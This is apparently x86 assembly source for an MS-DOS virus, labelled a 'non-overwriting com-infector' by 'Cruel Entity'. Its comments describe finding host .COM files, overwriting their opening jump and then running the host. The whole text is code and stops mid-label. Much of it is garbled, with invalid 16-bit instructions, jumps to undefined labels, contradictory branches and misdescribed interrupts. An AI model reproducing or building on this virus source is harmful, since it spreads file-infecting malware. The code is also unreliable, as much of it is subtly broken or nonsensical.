;
;       A simple, self-extracting non-overwriting com-infector
;                       by Cruel Entity
;

code segment public 'code'
		assume	cs:code, ds:code, es:code, ss:nothing

cur_len equ	offset end_all-100h                     ;all code is
                                                      ;relative to 
                                                      ;100h (beginning
                                                      ;of file)

	org	100h                                  ;produce a com-
												   ;file

start:
com_end	equ	$                                   ;mark start of
												   ;virus code

v_start	equ	$                                   ;start of virus
save_three_bytes db	3 dup(90h)                    ;save first three
                                                    ;bytes of host
												   ;program here
												   
	mov	cx,3                                  
	mov	si,offset param                      ;
	mov	di,$+2                               ;                                                                        
	repe	cmpsb                                ;compare two                        
                                                     ;strings till they match
	jnz	param_error                          ;if not then bail out
	lea	si,[si-(param_error-$+3)]            ;

	pushd	si                                   ;put it back
	lea	si,[si+offset old_j]                 ;
	mov	di,offset temp_1                     ;
	pushf                                        ;                                     
	call	carry_flag                           ;get carry flag
	call	cwd                                  ;and zero registers quickly
	popf                                         ;

	cld                                          ;clear direction flag
	movsw                                        ;move a few bytes
	movsb

	xor	ax,ax
	dec	ax
	push	ax                                 ;set up a far jump
	pop	ax
	add	ax,_heap-end_all                   ;to the far jump

	cmp	sp,ax                                ;is stack == seg ?
	jne	fix_segregs                          ;no? fix them

	call	restore_one_more_byte               ;fix one byte early

cln_srch:
	lodsw				                  ;load two bytes
	cmp	ax,'EB' or 'eB'                      ;does it look like
	je	cln_file                             ;a save_three_bytes
	cmp	ax,5D7Ch or 6C5Dh                   ;?
	je	cln_file                             ;then same
	cmp	ax,40CC or 63CDh                    ;looks OK
	jne	fix_seg                              ;but check if CS needs
			                            ;changing anyway
	cmp	byte ptr [bx+_heap-end_all],'0'+'A'-1 ;is there a reg=0?
	jne	cls_srch                             ;no? keep looking
	jmp	short cln_file                       ;yes? then we have a
			                            ;clean mark and can go on
fix_seg:
	call	rotate_segment_registers             ;fix our segments
                                                ;upwards from DS
find_start:
	add	bp,_heap-end_all                     ;add offset value
						        ;to DI & BP
	add	di,bp

	push	es
	pop	ds			              ;DS set to ES
	
find_jmp:
	mov	dx,100h                              ;check first three
	mov	al,byte ptr [bp-com_end]             ;bytes to see if
					          ;it's really a file
	cmp	al,byte ptr [ds:dx]
	jne	find_next                           
					
	inc	dx                                 ;
	cmp	ah,word ptr [bp-com_end][di-cur_len];                     
						      ;search for saved
	je	find_jmp                            ;jump at start of

find_next:
	add	bp,100h                              ;add 100h to BP &
					          ;try again for clean
	jmp	short find_start                     ;mark

fix_segregs:
	call	restore_one_more_byte

	mov	ax,ss			          ;seg equal to stack
	mov	ss,cs:[cur_len+4]                ;- 4
	sub	ss,ax
	mov	ax,cs:[cur_len+6]                ;- 6
	add	ax,1FFh
	div	word ptr _heap-end_all             ;and subtract size
	sub	ss,ax
	mov	ax,ss			      ;put all this shit in
	mov	ss,cs:[cur_len+4]		      ;the stack segment
	mov	ds,ax			      ;DS = SS
	mov	ax,cs:[cur_len+6]		      ;CS:IP will now point
	add	ax,1ffh			      ;to the far jump.
	div	word ptr _heap-end_all
	add 	ax,cs:[cur_len+4]
	mov	es,ax

	mov	es:_heap-end_all,ss		          ;store new values
						          ;for segment
fix_file:
	call	search_for_jmp			      ;find the jmp in the
	jc	file_infected			      ;host program

	call	write_jmp			      ;overwrite with a
	jnc	close_file			      ;new jump

close_file:
	call	get_dta			      ;fix DTA so no error
							  ;handlers interfere
	call	write_jmp			      ;write over the jump

	mov	ax,es				      ;get the current
	add	ax,10h			              ;segment offsets
	mov	bx,ax
	mov	dx,2176h			      ;_infect
	mov	cx,8000h                              ;_memsize
	int	1Ah				      ;get memory size

	mov	ax,es				      ;put that info into
	add	ax,10h			              ;some useful places
	mov	word ptr cs:[_end+3],ax	              ;so it can be used later
	mov	ax,cx
	mov	word ptr cs:[_end+5],ax

	mov	ax,es				      ;ES holds segment just
	sub	ax,word ptr cs:[_end+3]	              ;above top of heap
	add	ax,10h
	sub	word ptr cs:[_end+3],ax	              ;decrement segment
	jb	out_of_memory			      ;with each infection
	jmp	short get_new_host		      ;until it overflows
	
out_of_memory:
	mov	ax,-1				      ;return -1 to caller
	ret					      ;as an error code

get_new_host:
	call	cwd                                  ;quickly zero out
	call	move_four_bytes                     ;the four bytes are
			                              ;saved in temp_1 and
												   ;temp_2 buffers
	
	mov	dx,es				      ;search from above
	add	dx,word ptr cs:[_end+3]	              ;top of heap
	dec	dx				      ;starting with the
	mov	cl,5				      ;farthest forward
	mov	bx,dx				      ;segment register
	mov	ax,2				              ;and search for
	mov	cx,2				              ;first valid
	int	21h				              ;host

	mov	bx,temp_1			      ;put the address of the
	mov	ax,temp_2			      ;found file into ax
	add	bx,ax				      ;the buffer and
	add	bx,5				      ;add 5 bytes to skip
	mov	ax,es				      ;over the far jump
	add	ax,word ptr cs:[_end+3]	              ;when getting file
	add	ax,bx				      ;address
	cli					    ;set address of host
	mov	[sp+_old_j+4],ax			    ;to sp (_old_j is 
	mov	[sp+_old_j],bx			    ;equal to 4)
	sti

	push	ds
	pop	es

call_host:
	call	exec_host			      ;execute host prog.

	jmp	host_done			      ;and exit

file_infected:
	mov	ah,9				      ;print string
	lea	dx,[sp+_err_msg]                     ;point to string
	add	dx,sp
	add	dx,1				      ;point to string
	int	21h				      ;call int 21h to print
	
host_done:
	push	<ax>			         ;return -1 as error code
	ret					  ;and exit

search_for_jmp:
	cld					     ;clear direction flag
	lea	si,[sp+_j_code]		             ;point to possible
	add     si,sp                                  ;jmp code
	mov	di,100h		             ;and point to the
	mov	cx,3				     ;start of the file
	repz	cmpsb		             ;do the compare
	jne	srch_again		             ;if its not a jmp,
	iret					     ;return to caller
	
srch_again:
	lea	si,[sp+_j_code]		             ;otherwise move
	add     si,sp                                  ;forward until
	lea	di,[si-com_end+100h]                  ;another possible
	mov	cx,3				     ;jmp is found
	repz	cmpsb		             ;and do the compare
	jne	srch_again_2		             ;no jmp, keep searching
	
srch_again_2:
	cmp	byte ptr [di],0E9h		             ;look for short
	je	srch_again                             ;jmps, then try again
	jmp	srch_again_3

search_4th_byte:
	cmp	byte ptr [di],0EAh		             ;this time we're
	je	srch_again                             ;looking for 3
	jmp	srch_again_3                         ;byte jmps...

search_last_byte:
	cmp	byte ptr [di],0F9h		     ;finally looking for
	je	srch_again                             ;repz/stosb and
	jmp	srch_again_3                         ;repz/movs

search_last_byte_w_rep:
	cmp	byte ptr [di],0FCh	             ;same thing but
	je	srch_again                             ;this time with
	je	search_4th_byte                       ;repz movsw or
	jmp	srch_again_3                         ;repz lodsw

search_last_byte_w_out